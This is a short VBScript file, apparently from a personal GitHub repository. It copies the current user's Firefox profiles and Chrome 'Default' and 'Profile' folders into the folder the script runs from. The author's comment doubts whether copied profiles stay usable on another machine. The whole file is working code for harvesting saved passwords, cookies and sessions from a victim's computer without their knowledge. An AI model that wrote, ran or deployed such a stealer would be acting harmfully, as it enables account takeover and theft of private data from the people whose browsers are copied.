' @author Mqtth3w https://github.com/mqtth3w
' @license GPL-3.0
' Is this really useful? Does browsers use a specific encryption key depending on the machine? If true then copying a profile is useless

Option Explicit
Dim fso, sourcePathFirefox, sourcePathChrome, destinationPath, username
Set fso = CreateObject("Scripting.FileSystemObject")
username = CreateObject("WScript.Network").UserName
sourcePathFirefox = "C:\Users\" & username & "\AppData\Roaming\Mozilla\Firefox\Profiles"
sourcePathChrome = "C:\Users\" & username & "\AppData\Local\Google\Chrome\User Data" 
destinationPath = fso.GetParentFolderName(WScript.ScriptFullName)
destinationPath = destinationPath & "\"

If fso.FolderExists(sourcePathFirefox) Then
    fso.CopyFolder sourcePathFirefox, destinationPath
End If

If fso.FolderExists(sourcePathChrome) Then
    Dim profileFolder
    For Each profileFolder In fso.GetFolder(sourcePathChrome).SubFolders
       If profileFolder.Name = "Default" Or Left(profileFolder.Name, 7) = "Profile" Then 
           fso.CopyFolder profileFolder.Path, destinationPath
        End If
    Next
End If

Set fso = Nothing

